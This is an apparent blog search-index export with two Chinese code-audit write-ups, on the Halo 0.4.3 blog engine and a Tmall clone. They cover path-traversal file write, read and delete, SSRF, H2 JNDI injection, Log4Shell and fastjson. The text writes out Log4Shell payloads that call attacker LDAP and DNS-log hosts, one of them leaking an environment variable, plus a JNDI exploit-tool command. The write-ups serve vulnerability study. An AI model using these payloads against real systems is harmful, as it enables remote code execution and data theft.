<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Halo博客代码审计</title>
    <url>/2024/06/11/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h1><p><a class="link" href="https://github.com/halo-dev/halo/releases/tag/v0.4.3">Release 0.4.3 · halo-dev&#x2F;halo (github.com)<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="任意文件写入漏洞"><a href="#任意文件写入漏洞" class="headerlink" title="任意文件写入漏洞"></a>任意文件写入漏洞</h2><p>在ThemeController.java文件中,获取根路径并且获取输入的tplName值与路径拼接,然后将tplContent内容写入当中</p>
<p>并且在代码当中并没有对..&#x2F;进行过滤等操作,所以可以产生任意文件写入</p>
<p>跟踪路由到功能点</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211175458217.png" alt="image-20241211175458217"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211175608675.png" alt="image-20241211175608675"></p>
<p>抓包构造poc,验证漏洞</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180037437.png" alt="image-20241211180037437"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180024286.png" alt="image-20241211180024286"></p>
<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>同样在ThemeController.java文件下,发现获取模板内容,那有没有可能获取其他文件内容呢</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180407222.png" alt="image-20241211180407222"></p>
<p>抓包,看他的请求包,它的路径为admin&#x2F;themes&#x2F;getTpl并且需要一个get请求tplName,我们可以尝试访问我们之前写入的1.txt</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211180747041.png" alt="image-20241211180747041"></p>
<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>在备份数据库的地方有个删除功能,跟入代码</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181333410.png" alt="image-20241211181333410"></p>
<p>它将路径文件名拼接起来而已,就进行了删除,我们抓包构造poc,如果我们不知道前面的路径可以调试来找路径</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181536401.png" alt="image-20241211181536401"></p>
<p>获取到了路径,我们可以测试构造poc删除halo文件夹下的1.txt</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181903645.png" alt="image-20241211181903645"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181940683.png" alt="image-20241211181940683"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211181950768.png" alt="image-20241211181950768"></p>
<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>在正向梳理文章功能时,看到有个远程下载主题,猜想可能有ssrf</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211223632536.png" alt="image-20241211223632536"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211223719225.png" alt="image-20241211223719225"></p>
<p>命令执行调用git clone然后拼接网址造成ssrf</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211223836749.png" alt="image-20241211223836749"></p>
<h2 id="RCE-未出"><a href="#RCE-未出" class="headerlink" title="RCE(未出)"></a>RCE(未出)</h2><p>我们看到上面ssrf漏洞的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdResult</span> <span class="operator">=</span> RuntimeUtil.execForStr(<span class="string">&quot;git clone &quot;</span> + remoteAddr + <span class="string">&quot; &quot;</span> + themePath.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + themeName);</span><br></pre></td></tr></table></figure>

<p>猜想会不会是它自己写了一个方法调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure>

<p>我们跟入execForStr方法</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211224101179.png" alt="image-20241211224101179"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211225620837.png" alt="image-20241211225620837"></p>
<p>我们跟入exec方法,看到了命令执行语句,尝试构造poc,但是没有反应不知道为什么</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211225657096.png" alt="image-20241211225657096"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211225745277.png" alt="image-20241211225745277"></p>
<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><h2 id="H2-Database-代码注入"><a href="#H2-Database-代码注入" class="headerlink" title="H2 Database 代码注入"></a>H2 Database 代码注入</h2><p>进而在 pom.xml 进行依赖组件漏洞版本审查时，发现该系统使用了 H2 Database，但在 pom.xml 没有 显示 H2 Database 版本号，使用 Ctrl + 鼠标左键点击 com.h2database 进入查看版本号发现使用了 1.4.197 版本，这个版本存在 CVE-2021-42392 漏洞，即 H2 Database 控制台存在远程代码执行漏洞， 或者也可以说成存在 JNDI 注入漏洞</p>
<p>想要利用该漏洞有几个前提，在配置文件处可以看到： </p>
<ul>
<li>web-allow-others: true，这个设置允许其他网络上的计算机访问H2数据库的控制台。通常情况 下，H2数据库的控制台只允许本地访问，但设置为 true 后，其他计算机也可以通过网络访问该控 制台。 </li>
<li>enabled: true，这个设置启用了H2数据库的控制台。将其设置为 true 后，你就可以通过下述配 置的路径访问H2数据库的控制台。 </li>
<li>path: &#x2F;h2-console，这是H2数据库控制台的路径配置。它指定了通过Web浏览器访问控制台的 URL路径。在这个例子中，控制台可以通过 <a class="link" href="http://yourdomain/h2-console">http://yourdomain/h2-console<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>访问<a class="link" href="http://127.0.0.1:8090/h2-console,%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0h2%E6%8E%A7%E5%88%B6%E5%8F%B0">http://127.0.0.1:8090/h2-console,可以看到h2控制台<i class="fas fa-external-link-alt"></i></a></p>
<p>打开 CMD，进入该工具路径下，键入命令 java -jar JNDI-Injection-Exploit1.0-SNAPSHOT-all.jar -C “calc.exe” ，可以看出给出了 JNDI 链接</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211231030312.png" alt="image-20241211231030312"></p>
<p>复制上述链接 ldap:&#x2F;&#x2F;192.168.137.1:1389&#x2F;ng2ntb ，然后进入 H2 控制台，在 JDBC URL  处输入这个链接，Drive Class 键入 javax.naming.InitialContext ，最后点击 content，即可看到弹出了计算器</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Halo%E5%8D%9A%E5%AE%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241211231417413.png" alt="image-20241211231417413"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmall代码审计</title>
    <url>/2024/05/29/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">前台文件上传</span><br><span class="line">鉴权绕过</span><br><span class="line">XSS(存储型)</span><br><span class="line">log4j2漏洞(CVE-2021-44228)</span><br></pre></td></tr></table></figure>

<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.xq.tmall<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tmall<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>tmall Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Database --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.mysql/mysql-connector-j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid-spring-boot-starter --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Json --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Jsp compatible--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>taglibs-standard-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Mybatis --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Spring --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- log4j2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-jul<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-slf4j-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.20.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>tmall<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--引入配置文件--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--引入静态文件--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/**<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分析上面的pom.xml文件与组件版本</span><br><span class="line"></span><br><span class="line">他引入了log4j-core是log4j的源码可能存在log4j漏洞</span><br><span class="line">log4j-api 是接口。不存在漏洞</span><br><span class="line"></span><br><span class="line">fastjson1.2.83 网上存在该漏洞的poc</span><br><span class="line"></span><br><span class="line">还引入了解析jsp的依赖,那可能存在文件上传</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Log4j漏洞"><a href="#Log4j漏洞" class="headerlink" title="Log4j漏洞"></a>Log4j漏洞</h2><p>触发函数为logger.info或者logger.error</p>
<p>搜索函数logger.info时.有几个参数都可控,但是他们限定了传入类型是Integer,所以没有产生漏洞</p>
<p>但是在ForeUserController.java中</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130222139117.png" alt="image-20241130222139117"></p>
<p>他的类型为String,所以构成漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:OS&#125;.mq6bqf.dnslog.cn&#125;</span><br><span class="line">也可以直接配合jndi注入命令执行</span><br><span class="line">$&#123;jndi:ldap://192.168.0.93:1389/o0pmya&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastjson漏洞"><a href="#fastjson漏洞" class="headerlink" title="fastjson漏洞"></a>fastjson漏洞</h2><p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。我们关注两个函数 JSON.parse() 和 JSON.parseObject() 。</p>
<p>本项目存在 JSON.parseObject(),如下所示</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130223349497.png" alt="image-20241130223349497"></p>
<p>双击进入 ProductController.java 文件，问题代码出现在了 第151行 ，使用 JSON.parseObject() 方 法反序列化了 propertyJson 参数，我们向上追踪 propertyJson 参数，该参数是 添加产品信息 接口中 产品属性JSON 字段</p>
<p>访问管理后台，经过一番查找，发现漏洞输入点位于 所有产品-添加一件产品 功能下。 点击添加一件产品后，使用BurpSuite抓包拦截记录请求数据包，发现请求地址为 admin&#x2F;product ，并 且产品属性信息为 propertyJson 字段参数，如下图所示：</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130223648178.png" alt="image-20241130223648178"></p>
<p>将上面的数据包，发送到Repeater模块，用于后续漏洞验证。 对 propertyJson 参数值进行URL解码，发现为JSON格式字符串，如下图所示：</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130223729740.png" alt="image-20241130223729740"></p>
<p>验证漏洞poc</p>
